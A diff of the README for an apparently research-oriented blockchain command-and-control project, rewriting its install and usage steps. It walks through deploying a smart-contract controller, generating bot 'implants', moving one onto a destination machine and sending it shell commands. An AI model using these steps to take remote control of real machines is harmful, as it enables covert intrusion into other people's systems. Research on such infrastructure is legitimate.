@@ -39,76 +39,83 @@ This project was created for Educational and Research purposes only. Its only pu
 
 
 # Installation
-This project is purposed to run on linux and Windows 10 (with linux subsystem installed) only.
+Runs on linux or Windows 10 (with linux subsystem installed) only.
+
+`git clone https://github.com/platdrag/UnblockableChains`
+`cd UnblockableChains`
+`python3 -m venv .\venv`
+Windows: `venv\Scripts\activate.bat`
+Linux: `venv\Scripts\activate`
+`pip install -r requirements.txt`
 
 ### Dependencies
-- python3-bitcoin
-- python3-pbkdf2
-- py-solc
-- web3
+- see requirements.txt
 
-### Dependencies - web UI
-- python3-flask
-- python3-werkzeug
-- Flask-Sockets
-- gevent-websocket
+# Usage - Windows
 
-### Use - linux
-- under `conf/deployment/DeploymentConf.BASE.yaml`, adjust the following values:
-    - path: solc binary (included under bin/)
-    - path: geth binary (included under bin/)
-    - path: `BlockChainData`
-    - path: `contractUri`
-    - path: `genesisFile`
-    - path: `keyGenScript
+`set PYTHONPATH=.\src`
+`python src\Server\DeployUnstoppableCnC.py .`
 
-- run the server bootstrap script:
+Runs the deployment script to initiate the controller backend. It will generate owner account, run a local full geth node, deploy the smart contract and create all necessary configuration to run controller UI.
 
-    export PYTHONPATH=src && \
-    python3 src/Server/DeployUnstoppableCnC.py .
-
-- run the server in interactive mode & use the `sc` object:
-
-    python3 -i src/Server/ServerCommands.py .
-    // ... log output
-
-- generate a new bot client instance:
-
-    >>> sc.generateNewClientInstance(1000000000000000000,opj('conf','clientGen', 'ClientConf.TEMPLATE.yaml'), port=30304)
-
-- generate a new bot client instance:
-
-    export PYTHONPATH=src && \
-    python3 -i ./src/Client/ClientCommands.py . generated/0xa55be06.../conf/clientConf.yaml
-
-- back on the server side interactive shell add work to the client:
-
-    >>> sc.addWork('0xa55be06a805566d480103cea559c4d1bc3f729d2', 'echo awesome')
-    // ... log output
-    ... confirmed match between instance issued command and result: ['echo awesome', 'awsome']
+`python -i src\Server\ServerCommands.py  .`
+`python >> clientAddress, clientConfTemplate = sc.generateNewClientInstance(opj('conf','clientGen', 'ClientConf.TEMPLATE.yaml'),fundValue=1000000000000000000, port=30304)`
 
 
-### Use - web UI
-- run the deployment script as described above
-- create `static/`, `templates` dir symlinks:
+# Usage - Command line (Linux)
+Note: For windows just replace / with \ in paths
 
-    ln -s src-webapp/static .
-    ln -s src-webapp/templates .
+Edit the deployment script (optional) at `conf/deployment/DeploymentConf.BASE.yaml`
 
-- run the webapp:
+Run the server bootstrap script. It will generate owner account, run a local full geth node, deploy the smart contract and create all necessary configuration to run controller UI. Optional:
 
-    export PYTHONPATH=src
-    python3 src-webapp/ecnc-webapp.py
+`export PYTHONPATH=./src && python3 src/Server/DeployUnstoppableCnC.py .`
 
-- access `http://127.0.0.1:5000/`
-- generate one or more client kits
-- run client nodes accordingly
-- wait for the clients to register
-- add/rm clients from index
-- run shell commands on index-included clients 
+Run the server in interactive mode & use the `sc` object to issue commands:
+
+`python3 -i src/Server/ServerCommands.py .`
+
+* Available commands: generateNewClientInstance, allowInstance, removeInstance, addWork, fundTransfer
+
+Generate a new bot client instance:
+
+`>>> sc.generateNewClientInstance(1000000000000000000,opj('conf','clientGen', 'ClientConf.TEMPLATE.yaml'), port=30304)`
+
+Note the generated wallet address. Implant will be placed under `./generated/<GeneratedWalletAddress>`
+Transfer the implant to destination machine and run it:
+
+`export PYTHONPATH=./src && python3 -i ./src/Client/ClientCommands.py . ./conf/clientConf.yaml`
+
+Client will run its own node, contact the contract and register with it.If successful, it will start a listener for incoming commands.
+Once client has registered, back on the server side use interactive shell to add work to the client:
+
+``` 
+>>> sc.addWork('0xa55be06a805566d480103cea559c4d1bc3f729d2', 'echo awesome')
+// ... log output
+... confirmed match between instance issued command and result: ['echo awesome', 'awsome']
+```
+
+### Usage - web UI
+Run the deployment script as described above
+Create `static/`, `templates` dir symlinks:
+
+`ln -s src-webapp/static .`
+`ln -s src-webapp/templates .`
+
+Run the webapp:
+
+`export PYTHONPATH=src`
+`python3 src-webapp/ecnc-webapp.py`
+
+Access `http://127.0.0.1:5000/`
+Generate one or more implants
+Run client nodes as described above
+Wait for the clients to register
+Add/rm clients from index
+Run shell commands on index-included clients 
 
 
-# Todos
+# Todos (Future work)
 - Implement public key encryption
 - Split fund to generated implant to a small fee up front that will suffice only registration and then transfer the rest after registration.
 - Support multiple contract addresses
